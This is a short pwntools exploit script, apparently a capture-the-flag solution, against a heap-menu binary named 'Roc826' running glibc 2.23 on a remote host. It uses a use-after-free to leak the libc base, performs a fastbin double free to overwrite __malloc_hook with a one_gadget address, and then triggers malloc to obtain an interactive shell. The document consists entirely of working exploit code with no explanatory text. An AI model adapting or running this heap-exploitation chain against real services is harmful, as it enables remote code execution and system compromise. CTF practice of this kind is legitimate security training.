from pwn import*
p = process('./Roc826')
p = remote('47.103.214.163',21002)
elf = ELF('Roc826')
libc = ELF('libc-2.23.so')
context.log_level = 'debug'
def add(size,data):
	p.recvuntil('exit')
	p.sendline('1')
	p.sendlineafter('size?',size)
	p.sendlineafter('content:',data)
def dele(index):
	p.recvuntil('exit')
	p.sendline('2')
	p.sendlineafter('index?',index)
def show(index):
	p.recvuntil('4.exit')
	p.sendline('3')
	p.sendlineafter('index?',index)
def exit():
	p.recvuntil('exit')
	p.sendline('4')
add('136','U'*0x10) #0
add('96','ZZZZ')#1
add('96','SSSS')#2

dele('0')
show('0')
p.recvuntil('content:')
libcbase = u64(p.recv(6).ljust(8,'\x00'))-0x3C4B20-88
log.success('LibcBase:\t'+hex(libcbase))
onegadget = libcbase + 0xf1147
malloc_hook=libcbase+0x3C4B20-0x10
dele('1')
dele('2')
dele('1')
add('96',p64(malloc_hook-0x23))
add('96','SSSS')
add('96','ZZZZ')
add('96','\x00'*19+p64(onegadget))
p.sendline('1')
p.sendlineafter('size?','10')
p.interactive()

